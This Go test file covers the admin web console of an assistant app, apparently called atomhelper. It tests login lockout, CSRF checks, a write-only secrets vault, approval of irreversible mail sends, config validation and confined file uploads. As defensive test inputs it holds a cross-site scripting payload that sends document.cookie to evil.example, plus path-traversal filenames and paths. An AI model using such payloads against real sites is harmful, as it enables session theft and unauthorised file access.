package admin

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log/slog"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/xiguac/atomhelper/internal/channel"
	"github.com/xiguac/atomhelper/internal/core"
	"github.com/xiguac/atomhelper/internal/event"
	"github.com/xiguac/atomhelper/internal/store/pg"
	"github.com/xiguac/atomhelper/internal/vault"
)

func TestCheckAddr_不是本机就必须有TLS(t *testing.T) {
	for addr, tls := range map[string]bool{"127.0.0.1:8780": false, "localhost:8780": false, "[::1]:8780": false, "0.0.0.0:443": true} {
		if err := CheckAddr(addr, tls); err != nil {
			t.Errorf("%s tls=%v 应被允许: %v", addr, tls, err)
		}
	}
	for _, addr := range []string{"0.0.0.0:8780", "118.195.207.111:8780", ":8780", "example.com:80"} {
		if err := CheckAddr(addr, false); err == nil {
			t.Errorf("%s 没有 TLS 应被拒绝", addr)
		}
	}
	if _, err := HashPassword("short"); err == nil {
		t.Fatal("过短的口令应被拒绝")
	}
}

const password = "correct horse battery"

type env struct {
	t      *testing.T
	srv    *httptest.Server
	client *http.Client
	store  *pg.Store
	vault  *vault.Vault
	cfg    string
	work   string
	csrf   string
}

// setup 需要真实数据库，设置 ATOM_TEST_DSN 后运行。
func setup(t *testing.T) *env {
	t.Helper()
	dsn := os.Getenv("ATOM_TEST_DSN")
	if dsn == "" {
		t.Skip("未设置 ATOM_TEST_DSN，跳过管理后台测试")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	st, err := pg.Open(ctx, dsn)
	if err != nil {
		t.Fatalf("连接失败: %v", err)
	}
	t.Cleanup(st.Close)
	if err := st.ResetForTest(ctx); err != nil {
		t.Fatalf("重置失败: %v", err)
	}
	if err := st.Migrate(ctx); err != nil {
		t.Fatalf("迁移失败: %v", err)
	}
	key, _ := vault.GenerateKey()
	safe, err := vault.Open(st.Vault(), key)
	if err != nil {
		t.Fatal(err)
	}
	dir := t.TempDir()
	e := &env{t: t, store: st, vault: safe, cfg: filepath.Join(dir, "config.yaml"), work: filepath.Join(dir, "files")}
	if err := os.WriteFile(e.cfg, []byte("files:\n  dir: "+filepath.ToSlash(e.work)+"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	hash, err := HashPassword(password)
	if err != nil {
		t.Fatal(err)
	}
	s, err := New(Options{
		Store: st, Vault: safe, ConfigPath: e.cfg, PasswordHash: hash,
		Tasks:  &channel.Kernel{Store: st, Bus: event.NewBus(st.Events(), st), Budget: core.DefaultBudget()},
		Status: func() string { return "" },
		Log:    slog.New(slog.NewTextHandler(io.Discard, nil)),
	})
	if err != nil {
		t.Fatalf("构造后台失败: %v", err)
	}
	e.srv = httptest.NewServer(s.Handler())
	t.Cleanup(e.srv.Close)
	jar, _ := cookiejar.New(nil)
	e.client = &http.Client{Jar: jar, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	return e
}

func (e *env) get(path string) (int, string) {
	e.t.Helper()
	resp, err := e.client.Get(e.srv.URL + path)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body)
}

func (e *env) post(path string, form url.Values) (int, string) {
	e.t.Helper()
	resp, err := e.client.PostForm(e.srv.URL+path, form)
	if err != nil {
		e.t.Fatal(err)
	}
	defer resp.Body.Close()
	// 跳转地址里带着结果，一并返回方便断言。
	loc, _ := url.QueryUnescape(resp.Header.Get("Location"))
	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, loc + string(body)
}

var reCSRF = regexp.MustCompile(`name="csrf" value="([0-9a-f]{64})"`)

func (e *env) login() {
	e.t.Helper()
	if code, _ := e.post("/login", url.Values{"password": {password}}); code != http.StatusSeeOther {
		e.t.Fatalf("登录应成功并跳转，实际 %d", code)
	}
	_, body := e.get("/")
	m := reCSRF.FindStringSubmatch(body)
	if m == nil {
		e.t.Fatal("页面里应有防伪令牌")
	}
	e.csrf = m[1]
}

func TestAdmin_不登录什么都看不到(t *testing.T) {
	e := setup(t)
	for _, path := range []string{"/", "/vault", "/memory", "/config", "/files", "/tasks/x", "/files/download?path=a"} {
		if code, body := e.get(path); code != http.StatusSeeOther || strings.Contains(body, "保险库") {
			t.Errorf("%s 未登录应跳去登录页，实际 %d", path, code)
		}
	}
	if code, _ := e.post("/vault", url.Values{"label": {"x"}, "value": {"y"}}); code != http.StatusSeeOther {
		t.Fatalf("未登录不能写保险库: %d", code)
	}
	if metas, _ := e.vault.List(context.Background()); len(metas) != 0 {
		t.Fatal("未登录的请求不应写入任何东西")
	}
	// 健康检查不用登录，但也不透露任何细节。
	code, body := e.get("/healthz")
	if code != 200 || !strings.Contains(body, `"ok":true`) {
		t.Fatalf("健康检查不对: %d %s", code, body)
	}

	// 口令连续输错会被锁住，这时连对的口令也进不去。
	for i := 0; i < maxFailures; i++ {
		if code, _ := e.post("/login", url.Values{"password": {"wrong"}}); code != http.StatusUnauthorized {
			t.Fatalf("错的口令应被拒绝: %d", code)
		}
	}
	if code, _ := e.post("/login", url.Values{"password": {password}}); code != http.StatusTooManyRequests {
		t.Fatalf("连续输错后应暂时锁住: %d", code)
	}
}

func TestAdmin_改动要带防伪令牌保险库只进不出(t *testing.T) {
	e := setup(t)
	e.login()
	ctx := context.Background()

	// 登录了但没带令牌（别的网页替你提交的表单就是这样）：拒绝。
	if code, _ := e.post("/vault", url.Values{"label": {"x"}, "value": {"y"}}); code != http.StatusForbidden {
		t.Fatalf("没带防伪令牌应被拒绝: %d", code)
	}
	if code, _ := e.post("/vault", url.Values{"csrf": {strings.Repeat("0", 64)}, "label": {"x"}, "value": {"y"}}); code != http.StatusForbidden {
		t.Fatalf("令牌不对应被拒绝: %d", code)
	}

	const secret = "sk-9f8e7d6c5b4a-very-secret"
	code, loc := e.post("/vault", url.Values{"csrf": {e.csrf}, "label": {"deepseek"}, "note": {"模型密钥"},
		"value": {secret + "\r\n"}, "tools": {"provider.deepseek，connector.mail"}})
	if code != http.StatusSeeOther || !strings.Contains(loc, "已存入") {
		t.Fatalf("存入失败: %d %s", code, loc)
	}
	metas, _ := e.vault.List(ctx)
	if len(metas) != 1 || strings.Join(metas[0].AllowedTools, ",") != "connector.mail,provider.deepseek" {
		t.Fatalf("条目或授权名单不对: %+v", metas)
	}
	// 存进去的值能被授权的工具取到，而且结尾的换行已经去掉。
	take, _ := e.vault.Lend("vault://deepseek", "provider.deepseek")
	if got, err := take(ctx); err != nil || got != secret {
		t.Fatalf("授权的工具应取得到原值: %q %v", got, err)
	}
	// 后台的任何页面上都看不到它。
	for _, path := range []string{"/vault", "/", "/config", "/memory"} {
		if _, body := e.get(path); strings.Contains(body, secret) {
			t.Fatalf("%s 页面上出现了保险库的内容", path)
		}
	}
	if code, _ := e.post("/vault/delete", url.Values{"csrf": {e.csrf}, "label": {"deepseek"}}); code != http.StatusSeeOther {
		t.Fatalf("删除失败: %d", code)
	}
	if metas, _ := e.vault.List(ctx); len(metas) != 0 {
		t.Fatal("删除后不应还在")
	}

	// 退出之后原来的会话作废。
	e.post("/logout", url.Values{"csrf": {e.csrf}})
	if code, _ := e.get("/vault"); code != http.StatusSeeOther {
		t.Fatalf("退出后应回到登录页: %d", code)
	}
}

func TestAdmin_任务与外部内容的转义(t *testing.T) {
	e := setup(t)
	e.login()
	ctx := context.Background()

	code, loc := e.post("/tasks", url.Values{"csrf": {e.csrf}, "goal": {"下周五下午三点跟供应商开会，记一下。地点 3 号会议室"}})
	if code != http.StatusSeeOther || !strings.HasPrefix(loc, "/tasks/") {
		t.Fatalf("建任务失败: %d %s", code, loc)
	}
	id := strings.TrimPrefix(loc, "/tasks/")
	task, err := e.store.GetTask(ctx, id)
	if err != nil || task.Origin != core.TrustUser || task.State != core.StateReady || task.Title != "下周五下午三点跟供应商开会，记一下" {
		t.Fatalf("后台建的任务应是用户等级、已入队，标题取第一句: %+v %v", task, err)
	}

	// 不是 UTF-8 的输入在门口就拦下，不让它到数据库里才报错。
	if code, _ := e.post("/tasks", url.Values{"csrf": {e.csrf}, "goal": {string([]byte{0xc3, 0xf7, 0xcc, 0xec})}}); code != http.StatusBadRequest {
		t.Fatalf("不是 UTF-8 的输入应被拒绝: %d", code)
	}

	// 一封邮件的内容进了步骤输出。它在页面上只能是文字，不能变成网页代码。
	step := core.NewStep(id, 1, core.StepTool, json.RawMessage(`{"id":"1.1@INBOX"}`))
	step.ToolName, step.Status, step.OutputTrust = "mail.read", core.StepDone, core.TrustExternal
	step.Output = json.RawMessage(`{"text":"<script>fetch('https://evil.example/?c='+document.cookie)</script><img src=x onerror=alert(1)>"}`)
	if err := e.store.AppendStep(ctx, step); err != nil {
		t.Fatal(err)
	}
	_, body := e.get("/tasks/" + id)
	if strings.Contains(body, "<script>fetch") || strings.Contains(body, "<img src=x") {
		t.Fatal("外部内容里的标签必须被转义")
	}
	// 输出是按 JSON 展示的，尖括号在里面写成反斜杠加 u003c 的形式；无论哪种写法，内容本身要看得到。
	if !strings.Contains(body, "&lt;script&gt;") && !strings.Contains(body, "u003cscript") {
		t.Fatalf("转义后的内容应仍能看到: %s", body[strings.Index(body, "做过的步骤"):])
	}
	if !strings.Contains(body, "外部内容") {
		t.Fatal("来自外部的步骤应有标记")
	}

	// 等确认的动作：完整展示参数，批准后继续。
	wait := core.NewStep(id, 2, core.StepTool, json.RawMessage(`{"to":["liwei@example.com"],"body":"收到，周五见"}`))
	wait.ToolName, wait.Status, wait.SideEffect = "mail.send", core.StepAwaiting, core.SideEffectIrreversible
	if err := e.store.AppendStep(ctx, wait); err != nil {
		t.Fatal(err)
	}
	task, _ = e.store.GetTask(ctx, id)
	task.Wake = &core.WakeCondition{Kind: core.WakeApproval, Ref: wait.ID}
	task.NextSeq = 3
	_ = e.store.Transition(ctx, id, core.StateReady, core.StateRunning, "测试")
	if err := e.store.UpdateTaskRuntime(ctx, task); err != nil {
		t.Fatal(err)
	}
	if err := e.store.Transition(ctx, id, core.StateRunning, core.StateWaiting, "等待用户确认：mail.send"); err != nil {
		t.Fatal(err)
	}
	_, body = e.get("/tasks/" + id)
	if !strings.Contains(body, "等你确认：") || !strings.Contains(body, ">mail.send</span>") || !strings.Contains(body, "做了就收不回来") || !strings.Contains(body, "收到，周五见") || !strings.Contains(body, "liwei@example.com") {
		t.Fatalf("应完整展示等确认的动作:\n%s", body)
	}
	if _, home := e.get("/"); !strings.Contains(home, `等你处理 <span class="count warn">1</span>`) || !strings.Contains(home, "等你确认：") {
		t.Fatal("首页应把它列在等你处理里")
	}
	if code, loc := e.post("/tasks/"+id+"/approve", url.Values{"csrf": {e.csrf}}); code != http.StatusSeeOther || !strings.Contains(loc, "已批准") {
		t.Fatalf("批准失败: %d %s", code, loc)
	}
	steps, _ := e.store.ListSteps(ctx, id)
	if steps[1].Status != core.StepApproved {
		t.Fatalf("批准后这一步应标为已批准: %s", steps[1].Status)
	}
}

func TestAdmin_配置校验与文件(t *testing.T) {
	e := setup(t)
	e.login()

	// 有错的配置一个字都不写进去。
	before, _ := os.ReadFile(e.cfg)
	for name, bad := range map[string]string{
		"拼错的字段":   "filez:\n  dir: /tmp\n",
		"密钥写了明文":  "providers:\n  - {name: d, base_url: 'https://x', api_key: sk-abcdef}\n",
		"不是 YAML": "::: [",
	} {
		code, loc := e.post("/config", url.Values{"csrf": {e.csrf}, "text": {bad}})
		if code != http.StatusSeeOther || !strings.Contains(loc, "没有保存") {
			t.Errorf("%s: 应被拒绝: %d %s", name, code, loc)
		}
		if now, _ := os.ReadFile(e.cfg); !bytes.Equal(now, before) {
			t.Fatalf("%s: 校验不过时配置文件不应被改动", name)
		}
	}
	good := string(before) + "reply:\n  style: balanced\nproviders:\n  - {name: deepseek, base_url: 'https://api.deepseek.com', api_key: 'vault://deepseek'}\n"
	if code, loc := e.post("/config", url.Values{"csrf": {e.csrf}, "text": {strings.ReplaceAll(good, "\n", "\r\n")}}); code != http.StatusSeeOther || !strings.Contains(loc, "已保存") {
		t.Fatalf("合法的配置应保存: %d %s", code, loc)
	}
	if now, _ := os.ReadFile(e.cfg); string(now) != good {
		t.Fatalf("保存的内容不对（换行应统一）: %q", now)
	}
	if bak, _ := os.ReadFile(e.cfg + ".bak"); !bytes.Equal(bak, before) {
		t.Fatal("旧配置应留一个备份")
	}
	if _, body := e.get("/config"); !strings.Contains(body, "style: balanced") {
		t.Fatal("配置页应显示当前的配置")
	}

	// 上传：浏览器给的文件名里带路径也只认最后一段，出不了工作区。
	upload := func(filename, dir, content string) (int, string) {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		_ = mw.WriteField("csrf", e.csrf)
		_ = mw.WriteField("dir", dir)
		fw, _ := mw.CreateFormFile("file", filename)
		_, _ = fw.Write([]byte(content))
		_ = mw.Close()
		resp, err := e.client.Post(e.srv.URL+"/files", mw.FormDataContentType(), &buf)
		if err != nil {
			t.Fatal(err)
		}
		defer resp.Body.Close()
		loc, _ := url.QueryUnescape(resp.Header.Get("Location"))
		return resp.StatusCode, loc
	}
	if code, loc := upload(`..\..\evil.txt`, "", "x"); code != http.StatusSeeOther || !strings.Contains(loc, "已放进工作区: evil.txt") {
		t.Fatalf("文件名里的路径应被去掉: %d %s", code, loc)
	}
	if _, err := os.Stat(filepath.Join(filepath.Dir(e.work), "evil.txt")); err == nil {
		t.Fatal("文件不应落到工作区之外")
	}
	if code, loc := upload("销售.csv", "../outside", "x"); !strings.Contains(loc, "e=") {
		t.Fatalf("目录跳出工作区应被拒绝: %d %s", code, loc)
	}
	if code, loc := upload("销售.csv", "报表", "产品,销量\nA,1\n"); code != http.StatusSeeOther || !strings.Contains(loc, "报表/销售.csv") {
		t.Fatalf("上传失败: %d %s", code, loc)
	}
	if _, body := e.get("/files?dir=报表"); !strings.Contains(body, "报表/销售.csv") {
		t.Fatal("文件页应列出刚上传的文件")
	}
	resp, err := e.client.Get(e.srv.URL + "/files/download?path=" + url.QueryEscape("报表/销售.csv"))
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if string(raw) != "产品,销量\nA,1\n" || !strings.HasPrefix(resp.Header.Get("Content-Disposition"), "attachment") {
		t.Fatalf("下载的内容或方式不对: %q %s", raw, resp.Header.Get("Content-Disposition"))
	}
	if code, _ := e.get("/files/download?path=" + url.QueryEscape("../config.yaml")); code != http.StatusNotFound {
		t.Fatalf("下载工作区之外的文件应被拒绝: %d", code)
	}
}
